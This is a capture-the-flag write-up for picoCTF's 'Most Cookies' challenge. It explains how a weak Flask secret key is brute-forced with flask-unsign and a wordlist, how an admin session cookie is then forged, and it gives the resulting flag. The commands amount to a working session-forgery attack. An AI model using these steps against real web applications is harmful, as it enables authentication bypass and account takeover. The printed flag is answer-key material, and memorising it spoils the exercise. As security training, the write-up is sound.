# Most Cookies

## Description

Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [http://mercury.picoctf.net:65344/](http://mercury.picoctf.net:65344/) (view server.py reference at the end of page)

## Hint(s)

1. How secure is a flask cookie?

## Approach

I analyzed the server.py reference code. The highlighted code below has great importance.

```python
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp
```

I found that if you entered a cookie name given in the cookie name list (view line 7 in the server.py code), you will go into the first if statement but completely miss the nested if:

```python
if check == "admin":
```

From this, it is clear we need to become admin to swipe that flag!

OK ... back to crying ;'D

Let's visit the given [site](http://mercury.picoctf.net:65344/).

Use our old friend inspect > Application > Storage > Cookies

> From there, we see a cookie named session. View the cookie value: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YGEboA.IQGWCL0DE41HutgJ_FAK438Iams

> You can view more information [here](https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce) for the details of each cookie value segment.

Let's go to [https://jwt.io/](https://jwt.io/) to decode that cookie value ... we observe that the header is
{
"very_auth": "blank"
}

> Yikes. We want to be "admin" instead of "blank"

> Another thing to point out on that site is that there is a "verify signature" section. Since flask cookies involve encryption, there is a secret key set to protect against attackers.

So here's the official plan (heavily inspired by [this video](https://youtu.be/kru8On32BqY)):

### 1. Find the secret key

Due to being heavily inspired by the video, we will use a virtual machine to use the [Ubuntu operating system](https://help.ubuntu.com/lts/installation-guide/s390x/ch01s01.html). Ubuntu is great since Python is pre-installed into it and has packages that Windows lacks.

After abusing google, I found this blessing, [flask-unsign](https://pypi.org/project/flask-unsign/), which is a tool that will help us uncover the secret key.

Let's install flask-unsign.

```console
$ pip3 install flask-unsign
```

Ok, let's see how it works. On the given pico website, let's enter a cookie "snickerdoodle" (part of the cookie name list). Then you should see a page that says "I love snickerdoodle cookies!". Anyways, just inspect the page and copy the cookie value. Paste it in the following code.

```console
$ flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YGEviQ.nGAiw1-qnImOSgTL5Lk19SjA97A'
# outputs
{'very_auth': 'snickerdoodle'}
```

We're very close to greatness! Now let's continue to scroll down the flask-unsign website shall we ... and we see this section 'Unsigning (Brute Forcing Secret Keys)'.

#### FIRST WAY THAT I USED TO FIND THE SECRET KEY

```console
$ flask-unsign --unsign --cookie < cookie.txt
# this is the code on the flask-unsign website
```

I stared at the code and realized their cookie.txt contained a cookie value. So I decided to make my own cookie.txt with a cookie value inside:

```text
eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YGEviQ.nGAiw1-qnImOSgTL5Lk19SjA97A
```

The cookie value I stashed into cookie.txt is the one above where I entered 'snickerdoodle'.

I also made a wordlist.txt of the cookie names found in server.py (this will serve as my word list to brute force the secret key). View in the references section at the bottom.

Ensure that you are in the correct folder that contains cookie.txt and wordlist.txt ... then you can enter this script:

```console
$ flask-unsign --unsign --cookie < cookie.txt --wordlist wordlist.txt
```

After an agonizing 1 second, you are slapped with the secret key!! In my case, it was 'fortune'. Lucky me!

#### FASTER WAY THAT I USED TO FIND THE SECRET KEY

```console
$ flask-unsign --unsign --server 'http://mercury.picoctf.net:65344/' --wordlist wordlist.txt
```

### 2. Use the secret key to generate our own cookie

With the secret key, the rest will be a breeze. Time to forge our own session cookie! >:D

I found this godly [website](https://github.com/noraj/flask-session-cookie-manager) about encoding flask session cookies. On the website, there is an 'Encode' section ... so I used their code.

```console
$ flask_session_cookie_manager3.py encode -s fortune -t "{'very_auth':'admin'}"
# we attach the secret key and confirm admin
```

And ... we are blessed with our very own forged cookie!!!!!!!!!!!!!!!

```text
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YGEVdA.Fqe_gJWtcM37UiFmpaWsMkhel6w
```

### 3. Insert our cookie into the [site](http://mercury.picoctf.net:65344/) to replace the cookie value

Copy and paste that bad boy into the cookie value.

### 4. Reload the page to receive salvation

## Flag

picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}

## References

### server.py

```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()
```

### wordlist.txt

```
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```
